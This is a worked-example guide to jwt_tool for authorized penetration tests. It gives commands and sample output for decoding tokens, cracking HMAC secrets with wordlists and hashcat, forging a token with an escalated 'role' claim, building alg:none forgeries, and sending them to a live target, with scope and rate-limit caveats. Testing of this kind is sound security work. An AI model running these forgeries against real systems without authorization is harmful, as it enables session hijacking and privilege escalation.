# jwt_tool — worked examples

Six complete workflows: the first four are **offline** and send no packets, the
last two touch a target and need that target confirmed for the engagement. Every
command is written against the pinned v2.3.0 in this image.

Two properties of the tool shape all of these:

- **Banner and colour are on by default.** Add `-b` in anything that goes through
  a pipe or a file. `-b` prints tokens only, and it is what makes the output
  parseable.
- **`logs.txt` under the tool's data path records every token it sees.** Keep
  `$WORK` evidence separate from that file, and treat both as credential
  material.

```bash
export WORK=/working/engagements/example
mkdir -p "$WORK/jwt"
chmod 700 "$WORK/jwt"

# The token under test, from the engagement, as a credential file.
# Never paste a live token into the transcript.
jwt_tool --help >/dev/null 2>&1 || true   # first run builds jwtconf.ini and exits 1
TOKEN_FILE="$WORK/jwt/token.txt"
TOKEN=$(cat "$TOKEN_FILE")
```

## 1. Decode a token offline — what is this, and does it still hold up?

No target, no authorization question: this only reads a token you already hold.

```bash
jwt_tool -b "$TOKEN"
```

Real output shape (a fresh config prints its own banner lines on the very first
run — re-run once if you see `Configuration file built …` and nothing else):

```
Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "HS256"

Token payload values:
[+] user = "guest"
[+] role = "user"
[+] iat = 1750000000    ==> TIMESTAMP: Tue Jun 10 2025 12:26:40
[+] exp = 1750003600    ==> TIMESTAMP: Tue Jun 10 2025 13:26:40
[+] TIMESTAMP STATS:
[+] Earliest timestamp: Tue Jun 10 2025 12:26:40
[+] Latest timestamp: Tue Jun 10 2025 13:26:40
```

What to read out of it: the `alg` (this decides which of the later workflows are
even applicable — `-C` is HMAC-only, `-V` is asymmetric-only), the claim names
that carry authorization (`role`, `scope`, `admin`, `tenant`), and the time
claims. `-v` adds a little more parsing detail.

Independent cross-check with the venv interpreter's own libraries, so you are not
relying on one tool's decode:

```bash
/opt/venvs/jwt-tool/bin/python3 - "$TOKEN" <<'PY'
import base64, json, sys
def seg(s):
    return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))
h, p, _ = sys.argv[1].split(".")
print(json.dumps(seg(h), indent=2))
print(json.dumps(seg(p), indent=2))
PY
```

If the two disagree, stop and find out why before drawing conclusions — a token
that does not decode cleanly is itself the finding.

## 2. Tamper a claim offline and re-sign — the non-interactive path

The interactive editor (`-T`) is the obvious way to do this and the wrong one in
this container: it prints a menu and reads stdin, so unattended it hangs and
nothing is produced. The non-interactive equivalent is `-I` with an explicit
claim and value.

**Escalate `role` in an HMAC token you already cracked, and re-sign with the
known secret:**

```bash
jwt_tool -b -I -pc role -pv admin -S hs256 -p "$SECRET" "$TOKEN" \
  > "$WORK/jwt/forged-role-admin.txt"
wc -c < "$WORK/jwt/forged-role-admin.txt"
```

The output file is the forged token, one line. Its signature is valid for the
real secret, which is why this file is credential material: it is an
administrator token until the secret or the claim handling changes.

**Swap the algorithm claim header without a signature of your own:**

```bash
jwt_tool -b -I -hc alg -hv none "$TOKEN" > "$WORK/jwt/forged-algnone-header.txt"
```

Without `-S`, the signature segment is left as it was, and the tool says so:
`Signature unchanged - no signing method specified (-S or -X)`. That is the
offline form of the `alg:none` forgery — useful as a local artefact, harmless
until something sends it.

Traps that bite here:

- `-hc`/`-hv` (and `-pc`/`-pv`) must pair up one-to-one. A missing value prints
  `Must specify header values to match header claims to inject.`; an uneven count
  prints `Amount of header values must match header claims to inject.`
- If a value string happens to name an existing file, jwt_tool treats it as a
  **wordlist** and generates one token per line instead of setting the literal
  value. `-pv admin` is safe; a value that is a path is not.
- For asymmetric algorithms `-S rs256 …` needs `-pr FILE` or the generated key
  pair under the tool's data directory; only the HMAC variants take `-p`.

## 3. Crack the HMAC secret

Only meaningful for an `HS*` token. For anything else the tool tells you so and
returns: `Algorithm is not HMAC-SHA - cannot test against passwords, try the
Verify function.`

```bash
jwt_tool -b -C -d /opt/jwt_tool/jwt-common.txt "$TOKEN" \
  | tee "$WORK/jwt/crack.txt"
```

`jwt-common.txt` is a short list of well-known secrets — this is a fast common-
case check, not a real cracking run. Two real outcomes:

```
[+] secret is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
… -S hs256 -p "secret"
```

or, when the list is exhausted:

```
[-] Key not in dictionary
…
[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt
[*] rule-based attack: hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
```

Those are the tool's own hashcat suggestions for mode `16500`. Take the exact
lines it printed rather than reconstructing them:

```bash
# The wordlist has to exist and be sized to the job — check before a long run.
wc -l /opt/wordlists/current/Passwords/Leaked-Databases/rockyou.txt 2>/dev/null \
  || ls /opt/wordlists/current/Passwords/ | head
printf '%s\n' "$TOKEN" > "$WORK/jwt/jwt.txt"   # hashcat wants the raw token
```

The three failure readings that matter:

- `Key not in dictionary` — **not** "the secret is strong". The list simply did
  not contain it.
- `[-] <candidate> is not the correct key` repeated for every word — normal; that
  is the per-candidate trace, and it is suppressed for large lists.
- Testing a non-HMAC token — the tool returns without cracking, which is a wrong
  operation, not a negative result. Re-read the `alg` from workflow 1.

## 4. Verify against a JWKS

Before hypothesising about a token, establish what keys the server actually
publishes. Fetch the JWKS, then let the tool derive public keys from it and try
each one.

```bash
mkdir -p "$WORK/jwt"
curl -s "https://$TARGET/.well-known/jwks.json" -o "$WORK/jwt/jwks.json"
jq '{keys: [.keys[] | {kty, kid, use, alg}]}' "$WORK/jwt/jwks.json"
jwt_tool -b -V -jw "$WORK/jwt/jwks.json" "$TOKEN"
```

The verbose parse is the useful part:

```
JWKS Contents:
Number of keys: 2
--------
Key 1
kid: 2025-06
[+] kty = RSA
[+] n = …
[+] e = AQAB
Found RSA key factors, generating a public key
[+] /root/.jwt_tool/jwttool_custom_public_RSA_20250610…pem
Attempting to verify token using …
```

Reads to watch for:

- `Found ECC key factors` / `Found RSA key factors` with no verification verdict
  underneath means no key matched — the token was not signed by anything in this
  JWKS, which is a finding in itself (wrong issuer, rotated key, or a token from
  a different environment).
- `Single key file` means the document was not a JWKS bundle but a bare key
  object; the tool still tries it.
- `-pk FILE` is the single-key equivalent when you have a PEM rather than a JWKS.
- `No Public Key or JWKS file provided (-pk/-jw)` means the flag never reached the
  tool — check quoting.

If the token verifies against a published key you do **not** hold the private
half of, then offline forgery is closed and the remaining questions are
implementation bugs — which is workflow 5.

## 5. `alg:none` against a confirmed target — one hypothesis, bounded

**This sends forged tokens to a live system. Stop unless `$TARGET` is confirmed
for this engagement, and get the specific exploit approved — `-X a` here, not
`-M at`.**

Everything that makes this a controlled test:

- `-np` — without it the generated `jwtconf.ini` sends the attempt through
  `127.0.0.1:8080`, which in this container is the VPN gateway's control API,
  not a proxy. The failure looks like the target rejecting the token.
- `-rt 30` — cap the request rate. The default is effectively unlimited.
- `-cv` — the canary is the only trustworthy success signal; status codes alone
  are not, because many applications answer 200 with a login page.

```bash
CANARY="Signed in as guest"     # text that only a valid session returns

# Baseline first: does the original token work, and does the canary appear?
curl -s -H "Authorization: Bearer $TOKEN" "https://$TARGET/account" | grep -c "$CANARY"
```

Only proceed if that returns `1`. Then send the forgery:

```bash
jwt_tool -X a -t "https://$TARGET/account" \
  -rh "Authorization: Bearer $TOKEN" \
  -cv "$CANARY" -rt 30 -np "$TOKEN" 2>&1 | tee "$WORK/jwt/algnone.log"
```

What the output means:

```
jwttool_1f0c… Exploit: "alg":"none" Response Code: 200, 4213 bytes
```

With the canary absent, that is a 200 **login page** — not a vulnerability. With

```
[+] FOUND "Signed in as guest" in response:
jwttool_1f0c… Exploit: "alg":"none" Response Code: 200, 4213 bytes
```

the target accepted an unsigned token as a real session. That is the finding;
record the log ID, the response code, the byte count and the request the tool
sent (`jwttool_<id> -Q` reproduces the details).

Two ways this run misleads you:

- **The prescan prompt.** With no `-cv`, or with a target that answers the same
  status for a valid and a missing token, the tool stops and asks
  `Do you wish to continue anyway? ("Y" or "N")` on stdin. An unattended run
  hangs there forever.
- **Session invalidation.** If the target kills the session after a bad token,
  the prescan reports `Original token not working after invalid submission` and
  exits — every result from that point would have been noise.

## 6. Read a previous request back out of the log

Every generated request is logged with an ID, the module, the target URL and the
full token. When a run printed an interesting line an hour ago and you no longer
have the terminal scrollback:

```bash
grep -o 'jwttool_[0-9a-f]\{32\}' /root/.jwt_tool/logs.txt | sort -u | tail -20
jwt_tool -Q jwttool_<id> -b
```

The first command lists the IDs; the second reprints the details of that request
and uses its token as the input, so the whole tool — `-I`, `-C`, `-X` — can be run
against the exact token that produced the interesting result:

```bash
jwt_tool -b -Q jwttool_<id> | head -30
jwt_tool -b -C -d /opt/jwt_tool/jwt-common.txt -Q jwttool_<id>
```

`ID not found in logfile` means the ID was mistyped or the log was rotated.
Note that `-Q` strips the token from the line it prints but the token itself is
still in the file on disk: `logs.txt` is a credential store, so delete it (or the
whole data directory) when the engagement closes.

---

**Before you finish any of the live workflows:** confirm the target, confirm the
specific exploit, keep `-rt` set, keep `-np` on, write the log to `$WORK`, and
record log IDs rather than tokens in the findings.
